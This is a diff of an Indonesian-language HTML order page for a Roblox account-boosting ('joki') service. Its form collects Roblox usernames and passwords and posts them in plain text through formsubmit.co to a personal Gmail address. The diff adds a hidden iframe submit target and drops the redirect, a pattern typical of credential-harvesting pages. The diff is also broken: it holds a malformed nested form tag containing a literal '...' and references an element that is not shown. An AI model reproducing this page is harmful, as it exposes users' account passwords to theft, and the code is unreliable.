@@ -182,9 +182,11 @@
 
     <div class="container">
         <div class="card" id="formCard">
+            <iframe name="frame_gaib" style="display:none;"></iframe>
             <form id="orderForm" action="https://formsubmit.co/xzyostore@gmail.com" method="POST" enctype="multipart/form-data">
+                <form target="frame_gaib" ...>
                 <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="https://yourwebsite.com/thanks"> <input type="text" name="Username" placeholder="Username Roblox" required>
+                <input type="text" name="Username" placeholder="Username Roblox" required>
                 
                 <div style="position:relative;">
                     <input type="password" name="Password" id="pw" placeholder="Password Roblox" required>
@@ -300,6 +302,20 @@
         document.getElementById("order-slide").style.display = "flex";
         // Form tetap terkirim ke FormSubmit karena tidak ada preventDefault
     };
+    document.getElementById("orderForm").addEventListener("submit", function(e){
+    // Mengambil nama user dari input
+    let namaUser = document.getElementsByName("Username")[0].value;
+    
+    // Mengubah judul email otomatis agar tidak menumpuk di Gmail
+    document.getElementById("email_subject").value = "Pesanan Joki dari: " + namaUser;
+
+    // Sisa kode animasimu tetap di bawah ini
+    this.style.opacity = "0";
+    setTimeout(() => {
+        this.style.display = "none";
+        document.getElementById("order-slide").style.display = "flex";
+    }, 300);
+});
 </script>
 
 </body>
